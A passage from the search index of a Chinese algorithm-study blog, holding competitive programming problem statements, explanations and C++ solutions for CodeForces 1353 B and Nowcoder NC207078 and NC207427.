<string.h> const long long num = 1e2 + 1; using namespace std; long long listA[num]; long long listB[num]; // \u4ea4\u6362\u5143\u7d20 void mySwap(long long& a, long long& b) { long long &c = b; b = a; a = c; } // \u964d\u5e8f\u6392\u5217 int cmp(long long a, long long b) { return a > b; } int main() { // test case long long t; long long n, k; long long ans = 0; long long markA, markB; // test case scanf(\"%lld\", &t); // for each test case while (t--) { scanf(\"%lld %lld\", &n, &k); // \u521d\u59cb\u5316 memset(listA, 0, sizeof(listA)); memset(listB, 0, sizeof(listB)); ans = markA = markB = 0; // \u8f93\u5165 for (int i = 0; i < n; i++) scanf(\"%lld\", &listA[i]); for (int i = 0; i < n; i++) scanf(\"%lld\", &listB[i]); // \u6392\u5e8f\uff0cA\u5347\u5e8fB\u964d\u5e8f sort(listA, listA + n); sort(listB, listB + n, cmp); // \u4ea4\u6362 for (int i = 0; i < k; i++) { if (listA[i] < listB[markB]){ mySwap(listA[i], listB[markB]); markB++; } } // \u6c42\u548c for (int i = 0; i < n; i++) ans += listA[i]; printf(\"%lld\\n\", ans); } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.CodeForces 1353 B Two Arrays And Swaps"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E8%B4%AA%E5%BF%83/1.CodeForces_1353_B_Two_Arrays_And_Swaps/#codeforces-1353-b-two-arrays-and-swaps","text":"","title":"CodeForces 1353 B. Two Arrays And Swaps"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E8%B4%AA%E5%BF%83/1.CodeForces_1353_B_Two_Arrays_And_Swaps/#_1","text":"CodeForces 1353 B. Two Arrays And Swaps \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Onput 1.5. Sample Input 1.6. Sample Onput 1.7. Note 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E8%B4%AA%E5%BF%83/1.CodeForces_1353_B_Two_Arrays_And_Swaps/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E8%B4%AA%E5%BF%83/1.CodeForces_1353_B_Two_Arrays_And_Swaps/#11-limit","text":"Time Limit: 1 second Memory Limit: 256 megabytes","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E8%B4%AA%E5%BF%83/1.CodeForces_1353_B_Two_Arrays_And_Swaps/#12-problem-description","text":"You are given two arrays a and b both consisting of n positive (greater than zero) integers. You are also given an integer k . In one move, you can choose two indices i and j ( 1 \\le i, j \\le n ) and swap a_i and b_j (i.e. a_i becomes b_j and vice versa). Note that i and j can be equal or different (in particular, swap a_2 with b_2 or swap a_3 and b_9 both are acceptable moves). Your task is to find the maximum possible sum you can obtain in the array a if you can do no more than (i.e. at most) k such moves (swaps). You have to answer t independent test cases.","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E8%B4%AA%E5%BF%83/1.CodeForces_1353_B_Two_Arrays_And_Swaps/#13-input","text":"The first line of the input contains one integer t ( 1 \\le t \\le 200 ) \u2014 the number of test cases. Then t test cases follow. The first line of the test case contains two integers n and k ( 1 \\le n \\le 30; 0 \\le k \\le n ) \u2014 the number of elements in a and b and the maximum number of moves you can do. The second line of the test case contains n integers a_1, a_2, \\dots, a_n ( 1 \\le a_i \\le 30 ), where a_i is the i -th element of a . The third line of the test case contains n integers b_1, b_2, \\dots, b_n ( 1 \\le b_i \\le 30 ), where b_i is the i -th element of b .","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E8%B4%AA%E5%BF%83/1.CodeForces_1353_B_Two_Arrays_And_Swaps/#14-onput","text":"For each test case, print the answer \u2014 the maximum possible sum you can obtain in the array a if you can do no more than (i.e. at most) k swaps.","title":"1.4. Onput"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E8%B4%AA%E5%BF%83/1.CodeForces_1353_B_Two_Arrays_And_Swaps/#15-sample-input","text":"5 2 1 1 2 3 4 5 5 5 5 6 6 5 1 2 5 4 3 5 3 1 2 3 4 5 10 9 10 10 9 4 0 2 2 4 3 2 4 2 3 4 4 1 2 2 1 4 4 5 4","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E8%B4%AA%E5%BF%83/1.CodeForces_1353_B_Two_Arrays_And_Swaps/#16-sample-onput","text":"6 27 39 11 17","title":"1.6. Sample Onput"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E8%B4%AA%E5%BF%83/1.CodeForces_1353_B_Two_Arrays_And_Swaps/#17-note","text":"In the first test case of the example, you can swap a_1 = 1 and b_2 = 4 , so a=[4, 2] and b=[3, 1] . In the second test case of the example, you don't need to swap anything. In the third test case of the example, you can swap a_1 = 1 and b_1 = 10 , a_3 = 3 and b_3 = 10 and a_2 = 2 and b_4 = 10 , so a=[10, 10, 10, 4, 5] and b=[1, 9, 3, 2, 9] . In the fourth test case of the example, you cannot swap anything. In the fifth test case of the example, you can swap arrays a and b , so a=[4, 4, 5, 4] and b=[1, 2, 2, 1] .","title":"1.7. Note"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E8%B4%AA%E5%BF%83/1.CodeForces_1353_B_Two_Arrays_And_Swaps/#18-source","text":"CodeForces 1353 B. Two Arrays And Swaps","title":"1.8. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E8%B4%AA%E5%BF%83/1.CodeForces_1353_B_Two_Arrays_And_Swaps/#2","text":"\u5c06 a \u5e8f\u5217\u6309\u7167\u5347\u5e8f\u6392\u5e8f\uff0c \u5c06 b \u6309\u7167\u964d\u5e8f\u6392\u5e8f\u3002 \u4f9d\u6b21\u904d\u5386 a \u5e8f\u5217\u4e2d\u7684\u6240\u6709\u5143\u7d20\uff0c\u5f53 a_i > b_j \u65f6\uff0c\u5c06 a_i \u548c b_j \u4ea4\u6362\uff0c\u7136\u540e j = j + 1 \u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E8%B4%AA%E5%BF%83/1.CodeForces_1353_B_Two_Arrays_And_Swaps/#3","text":"#include <algorithm> #include <iostream> #include <string.h> const long long num = 1e2 + 1; using namespace std; long long listA[num]; long long listB[num]; // \u4ea4\u6362\u5143\u7d20 void mySwap(long long& a, long long& b) { long long &c = b; b = a; a = c; } // \u964d\u5e8f\u6392\u5217 int cmp(long long a, long long b) { return a > b; } int main() { // test case long long t; long long n, k; long long ans = 0; long long markA, markB; // test case scanf(\"%lld\", &t); // for each test case while (t--) { scanf(\"%lld %lld\", &n, &k); // \u521d\u59cb\u5316 memset(listA, 0, sizeof(listA)); memset(listB, 0, sizeof(listB)); ans = markA = markB = 0; // \u8f93\u5165 for (int i = 0; i < n; i++) scanf(\"%lld\", &listA[i]); for (int i = 0; i < n; i++) scanf(\"%lld\", &listB[i]); // \u6392\u5e8f\uff0cA\u5347\u5e8fB\u964d\u5e8f sort(listA, listA + n); sort(listB, listB + n, cmp); // \u4ea4\u6362 for (int i = 0; i < k; i++) { if (listA[i] < listB[markB]){ mySwap(listA[i], listB[markB]); markB++; } } // \u6c42\u548c for (int i = 0; i < n; i++) ans += listA[i]; printf(\"%lld\\n\", ans); } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E8%B4%AA%E5%BF%83/2.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207078_%E4%BA%A4%E6%8D%A2/","text":"\u725b\u5ba2\u7f51 NC207078 \u4ea4\u6362 # \u76ee\u5f55 # \u725b\u5ba2\u7f51 NC207078 \u4ea4\u6362 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Note 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2 Memory Limit: C/C++ 262144K\uff0c\u5176\u4ed6\u8bed\u8a00524288K 1.2. Problem Description # \u725b\u5ba2\u5e7c\u513f\u56ed\u7684\u5c0f\u670b\u53cb\u8bfe\u95f4\u64cd\u65f6\u95f4\u9700\u8981\u6309\u7167\u5b66\u53f7\u4ece\u5c0f\u5230\u5927\u6392\u961f\uff0c\u4f46\u662f\u4ed6\u4eec\u592a\u5c0f\u4e86\u53ea\u80fd\u7ad9\u6210\u4e00\u5217\u987a\u5e8f\u5374\u4e0d\u5bf9\uff0c\u73b0\u5728\u5e7c\u513f\u56ed\u7684\u963f\u59e8\u9700\u8981\u5e2e\u5fd9\u4ea4\u6362\u5c0f\u670b\u53cb\u7684\u4f4d\u7f6e\u8ba9\u4ed6\u4eec\u6700\u7ec8\u6709\u5e8f\uff0c\u963f\u59e8\u5e0c\u671b\u80fd\u5c3d\u5feb\u5b8c\u6210\u4ea4\u6362\u64cd\u4f5c\uff0c\u95ee\u6700\u5c11\u9700\u8981\u4ea4\u6362\u591a\u5c11\u6b21\uff0c\u624d\u80fd\u4f7f\u5f97\u5c0f\u670b\u53cb\u4eec\u4ece\u5c0f\u5230\u5927\u6392\u597d\u3002\u6ce8\u610f\uff1a\u6bcf\u4e2a\u5c0f\u670b\u53cb\u7684\u5b66\u53f7\u4e0d\u540c\uff0c\u4f46\u662f\u672a\u5fc5\u8fde\u7eed\uff0c\u56e0\u4e3a\u53ef\u80fd\u6709\u5c0f\u670b\u53cb\u8bf7\u5047\u4e86\u6ca1\u6709\u6765\u3002 1.3. Input # \u7b2c\u4e00\u884c\u4e00\u4e2a\u6574\u6570 N \u3002 \u63a5\u4e0b\u6765 N \u884c\u6bcf\u884c\u4e00\u4e2a\u6574\u6570\uff0c\u4e3a\u5c0f\u670b\u53cb\u4eec\u7684\u961f\u5217\u3002 1.4. Output # \u4e00\u4e2a\u6574\u6570\u8868\u793a\u5c0f\u670b\u53cb\u4eec\u7684\u6700\u5c0f\u4ea4\u6362\u6b21\u6570\u3002 1.5. Sample Input # 3 2 1 3 1.6. Sample Output # 1 1.7. Note # N\\leq100000 \uff0c\u5176\u4ed6\u6574\u6570\u5747 \\leq 10^9 1.8. Source # \u725b\u5ba2\u7f51 NC207078 \u4ea4\u6362 2. \u89e3\u8bfb # \u5148\u5c06\u6570\u7ec4\u6392\u5e8f\uff0c\u6211\u4eec\u5c31\u5f97\u5230\u6bcf\u4e2a\u6570\u6392\u5e8f\u540e\u7684\u4f4d\u7f6e\u3002 \u7136\u540e\u5bf9\u539f\u59cb\u7684\u6570\u7ec4\u8fdb\u884c\u904d\u5386\uff0c\u5982\u679c\u5b83\u7684\u4f4d\u7f6e\u548c\u6392\u5e8f\u540e\u7684\u4f4d\u7f6e\u4e0d\u4e00\u81f4\uff0c\u5219\u5c06\u5176\u4ea4\u6362\u5230\u6392\u5e8f\u540e\u7684\u4f4d\u7f6e\u3002\u6bcf\u6b21\u4ea4\u6362\u81f3\u5c11\u5c06\u4e00\u4e2a\u6570\u4ea4\u6362\u5230\u5176\u5e94\u8be5\u6240\u5c5e\u7684\u4f4d\u7f6e\uff0c\u6709\u65f6\u80fd\u591f\u540c\u65f6\u5c06\u4e24\u4e2a\u6570\u90fd\u4ea4\u6362\u5230\u5176\u5e94\u8be5\u6240\u5c5e\u7684\u4f4d\u7f6e\u3002 \u8bb0\u5f55\u4ea4\u6362\u6b21\u6570\uff0c\u904d\u5386\u5b8c\u4ee5\u540e\u5c31\u5f97\u5230\u4e86\u6700\u5c0f\u4ea4\u6362\u6b21\u6570\u3002 3. \u4ee3\u7801 # #include <algorithm> #include <iostream> #include <map> using namespace std; const int N = 2e6 + 5; int a[N]; int b[N]; map<int, int> mp; int main() { int n; // \u8f93\u5165 cin >> n; for (int i = 0; i < n; i++) { cin >> a[i]; b[i] = a[i]; mp[a[i]] = i; } // \u6392\u5e8f sort(b, b + n); int sum = 0; // \u8ba1\u7b97 for (int i = 0; i < n; i++) { if (a[i] != b[i]) { int x = mp[a[i]], y = mp[b[i]]; // \u4ea4\u6362 swap(a[x], a[y]); mp[a[x]] = x; mp[a[y]] = y; // \u7d2f\u52a0 sum++; } } cout << sum; } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"2.\u725b\u5ba2\u7f51 NC207078 \u4ea4\u6362"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E8%B4%AA%E5%BF%83/2.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207078_%E4%BA%A4%E6%8D%A2/#nc207078","text":"","title":"\u725b\u5ba2\u7f51 NC207078 \u4ea4\u6362"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E8%B4%AA%E5%BF%83/2.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207078_%E4%BA%A4%E6%8D%A2/#_1","text":"\u725b\u5ba2\u7f51 NC207078 \u4ea4\u6362 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Note 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E8%B4%AA%E5%BF%83/2.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207078_%E4%BA%A4%E6%8D%A2/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E8%B4%AA%E5%BF%83/2.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207078_%E4%BA%A4%E6%8D%A2/#11-limit","text":"Time Limit: C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2 Memory Limit: C/C++ 262144K\uff0c\u5176\u4ed6\u8bed\u8a00524288K","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E8%B4%AA%E5%BF%83/2.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207078_%E4%BA%A4%E6%8D%A2/#12-problem-description","text":"\u725b\u5ba2\u5e7c\u513f\u56ed\u7684\u5c0f\u670b\u53cb\u8bfe\u95f4\u64cd\u65f6\u95f4\u9700\u8981\u6309\u7167\u5b66\u53f7\u4ece\u5c0f\u5230\u5927\u6392\u961f\uff0c\u4f46\u662f\u4ed6\u4eec\u592a\u5c0f\u4e86\u53ea\u80fd\u7ad9\u6210\u4e00\u5217\u987a\u5e8f\u5374\u4e0d\u5bf9\uff0c\u73b0\u5728\u5e7c\u513f\u56ed\u7684\u963f\u59e8\u9700\u8981\u5e2e\u5fd9\u4ea4\u6362\u5c0f\u670b\u53cb\u7684\u4f4d\u7f6e\u8ba9\u4ed6\u4eec\u6700\u7ec8\u6709\u5e8f\uff0c\u963f\u59e8\u5e0c\u671b\u80fd\u5c3d\u5feb\u5b8c\u6210\u4ea4\u6362\u64cd\u4f5c\uff0c\u95ee\u6700\u5c11\u9700\u8981\u4ea4\u6362\u591a\u5c11\u6b21\uff0c\u624d\u80fd\u4f7f\u5f97\u5c0f\u670b\u53cb\u4eec\u4ece\u5c0f\u5230\u5927\u6392\u597d\u3002\u6ce8\u610f\uff1a\u6bcf\u4e2a\u5c0f\u670b\u53cb\u7684\u5b66\u53f7\u4e0d\u540c\uff0c\u4f46\u662f\u672a\u5fc5\u8fde\u7eed\uff0c\u56e0\u4e3a\u53ef\u80fd\u6709\u5c0f\u670b\u53cb\u8bf7\u5047\u4e86\u6ca1\u6709\u6765\u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E8%B4%AA%E5%BF%83/2.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207078_%E4%BA%A4%E6%8D%A2/#13-input","text":"\u7b2c\u4e00\u884c\u4e00\u4e2a\u6574\u6570 N \u3002 \u63a5\u4e0b\u6765 N \u884c\u6bcf\u884c\u4e00\u4e2a\u6574\u6570\uff0c\u4e3a\u5c0f\u670b\u53cb\u4eec\u7684\u961f\u5217\u3002","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E8%B4%AA%E5%BF%83/2.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207078_%E4%BA%A4%E6%8D%A2/#14-output","text":"\u4e00\u4e2a\u6574\u6570\u8868\u793a\u5c0f\u670b\u53cb\u4eec\u7684\u6700\u5c0f\u4ea4\u6362\u6b21\u6570\u3002","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E8%B4%AA%E5%BF%83/2.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207078_%E4%BA%A4%E6%8D%A2/#15-sample-input","text":"3 2 1 3","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E8%B4%AA%E5%BF%83/2.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207078_%E4%BA%A4%E6%8D%A2/#16-sample-output","text":"1","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E8%B4%AA%E5%BF%83/2.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207078_%E4%BA%A4%E6%8D%A2/#17-note","text":"N\\leq100000 \uff0c\u5176\u4ed6\u6574\u6570\u5747 \\leq 10^9","title":"1.7. Note"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E8%B4%AA%E5%BF%83/2.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207078_%E4%BA%A4%E6%8D%A2/#18-source","text":"\u725b\u5ba2\u7f51 NC207078 \u4ea4\u6362","title":"1.8. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E8%B4%AA%E5%BF%83/2.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207078_%E4%BA%A4%E6%8D%A2/#2","text":"\u5148\u5c06\u6570\u7ec4\u6392\u5e8f\uff0c\u6211\u4eec\u5c31\u5f97\u5230\u6bcf\u4e2a\u6570\u6392\u5e8f\u540e\u7684\u4f4d\u7f6e\u3002 \u7136\u540e\u5bf9\u539f\u59cb\u7684\u6570\u7ec4\u8fdb\u884c\u904d\u5386\uff0c\u5982\u679c\u5b83\u7684\u4f4d\u7f6e\u548c\u6392\u5e8f\u540e\u7684\u4f4d\u7f6e\u4e0d\u4e00\u81f4\uff0c\u5219\u5c06\u5176\u4ea4\u6362\u5230\u6392\u5e8f\u540e\u7684\u4f4d\u7f6e\u3002\u6bcf\u6b21\u4ea4\u6362\u81f3\u5c11\u5c06\u4e00\u4e2a\u6570\u4ea4\u6362\u5230\u5176\u5e94\u8be5\u6240\u5c5e\u7684\u4f4d\u7f6e\uff0c\u6709\u65f6\u80fd\u591f\u540c\u65f6\u5c06\u4e24\u4e2a\u6570\u90fd\u4ea4\u6362\u5230\u5176\u5e94\u8be5\u6240\u5c5e\u7684\u4f4d\u7f6e\u3002 \u8bb0\u5f55\u4ea4\u6362\u6b21\u6570\uff0c\u904d\u5386\u5b8c\u4ee5\u540e\u5c31\u5f97\u5230\u4e86\u6700\u5c0f\u4ea4\u6362\u6b21\u6570\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E8%B4%AA%E5%BF%83/2.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207078_%E4%BA%A4%E6%8D%A2/#3","text":"#include <algorithm> #include <iostream> #include <map> using namespace std; const int N = 2e6 + 5; int a[N]; int b[N]; map<int, int> mp; int main() { int n; // \u8f93\u5165 cin >> n; for (int i = 0; i < n; i++) { cin >> a[i]; b[i] = a[i]; mp[a[i]] = i; } // \u6392\u5e8f sort(b, b + n); int sum = 0; // \u8ba1\u7b97 for (int i = 0; i < n; i++) { if (a[i] != b[i]) { int x = mp[a[i]], y = mp[b[i]]; // \u4ea4\u6362 swap(a[x], a[y]); mp[a[x]] = x; mp[a[y]] = y; // \u7d2f\u52a0 sum++; } } cout << sum; } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E9%AB%98%E7%B2%BE%E5%BA%A6/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207427_%E7%9B%B4%E7%BA%BF/","text":"\u725b\u5ba2\u7f51 NC207427 \u76f4\u7ebf # \u76ee\u5f55 # \u725b\u5ba2\u7f51 NC207427 \u76f4\u7ebf \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2 Memory Limit: C/C++ 262144K\uff0c\u5176\u4ed6\u8bed\u8a00524288K 1.2. Problem Description # \u5e73\u9762\u4e0a\u5b58\u5728 n \u6761\u76f4\u7ebf\u3002\u8bf7\u95ee n \u6761\u76f4\u7ebf\u5728\u5e73\u9762\u4e0a\u6700\u591a\u5b58\u5728\u591a\u5c11\u4ea4\u70b9\u3002 1.3. Input # \u8f93\u5165\u6570\u636e\u7684\u7b2c\u4e00\u884c\u662ft\uff0c\u8868\u793a\u6570\u636e\u7684\u7ec4\u6570 \uff08t < 100\uff09 , \u63a5\u4e0b\u6765\u6bcf\u7ec4\u6570\u636e\u8f93\u5165\u4e00\u4e2a n\uff081 \\le n \\le 1e15\uff09 1.4. Output # \u5bf9\u4e8e\u6bcf\u7ec4\u8f93\u5165\u6837\u4f8b\uff0c\u6253\u5370 n \u6761\u76f4\u7ebf\u6700\u591a\u6709\u591a\u5c11\u4e2a\u4ea4\u70b9 1.5. Sample Input # 2 1 2 1.6. Sample Output # 0 1 1.7. Source # \u725b\u5ba2\u7f51 NC207427 \u76f4\u7ebf 2. \u89e3\u8bfb # \u7b2c i + 1 \u6761\u7ebf\u6700\u591a\u80fd\u548c\u524d i \u6761\u7ebf\u90fd\u76f8\u4ea4\uff0c\u4ea7\u751f i \u4e2a\u65b0\u7684\u4ea4\u70b9\u3002 \u6240\u4ee5\u6700\u7ec8\u7ed3\u679c\u4e3a \\frac{n(n-1)}{2} \u4f46\u7531\u4e8e n \u7684\u6570\u636e\u8303\u56f4\u5f88\u5927 \uff081 \\le n \\le 1e15\uff09 \uff0c\u6240\u4ee5\u8981\u4f7f\u7528\u9ad8\u7cbe\u5ea6\u8fdb\u884c\u8ba1\u7b97\u3002\u9ad8\u7cbe\u5ea6\u6a21\u677f\u53c2\u8003\u81ea \u767e\u5ea6\u767e\u79d1-\u9ad8\u7cbe\u5ea6\u7b97\u6cd5 \u3002 3. \u4ee3\u7801 # #include <algorithm> #include <iostream> #include <vector> using namespace std; struct Wint : vector<int> //\u7528\u6807\u51c6\u5e93vector\u505a\u57fa\u7c7b\uff0c\u5b8c\u7f8e\u89e3\u51b3\u4f4d\u6570\u95ee\u9898\uff0c\u540c\u65f6\u66f4\u6613\u4e8e\u5b9e\u73b0 { //\u5c06\u4f4e\u7cbe\u5ea6\u8f6c\u9ad8\u7cbe\u5ea6\u7684\u521d\u59cb\u5316\uff0c\u53ef\u4ee5\u81ea\u52a8\u88ab\u7f16\u8bd1\u5668\u8c03\u7528 //\u56e0\u6b64\u65e0\u9700\u5355\u72ec\u5199\u9ad8\u7cbe\u5ea6\u6570\u548c\u4f4e\u7cbe\u5ea6\u6570\u7684\u8fd0\u7b97\u51fd\u6570\uff0c\u5341\u5206\u65b9\u4fbf Wint(int n = 0) //\u9ed8\u8ba4\u521d\u59cb\u5316\u4e3a0\uff0c\u4f460\u7684\u4fdd\u5b58\u5f62\u5f0f\u4e3a\u7a7a { push_back(n); check(); } Wint& check() //\u5728\u5404\u7c7b\u8fd0\u7b97\u4e2d\u7ecf\u5e38\u7528\u5230\u7684\u8fdb\u4f4d\u5c0f\u51fd\u6570\uff0c\u4e0d\u59a8\u5185\u7f6e { while (!empty() && !back()) pop_back(); //\u53bb\u9664\u6700\u9ad8\u4f4d\u53ef\u80fd\u5b58\u5728\u76840 if (empty()) return *this; for (size_t i = 1; i < size(); ++i) //\u5904\u7406\u8fdb\u4f4d { (*this)[i] += (*this)[i - 1] / 10; (*this)[i - 1] %= 10; } while (back() >= 10) { push_back(back() / 10); (*this)[size() - 2] %= 10; } return *this; //\u4e3a\u4f7f\u7528\u65b9\u4fbf\uff0c\u5c06\u8fdb\u4f4d\u540e\u7684\u81ea\u8eab\u8fd4\u56de\u5f15\u7528 } }; //\u8f93\u5165\u8f93\u51fa istream& operator>>(istream& is, Wint& n) 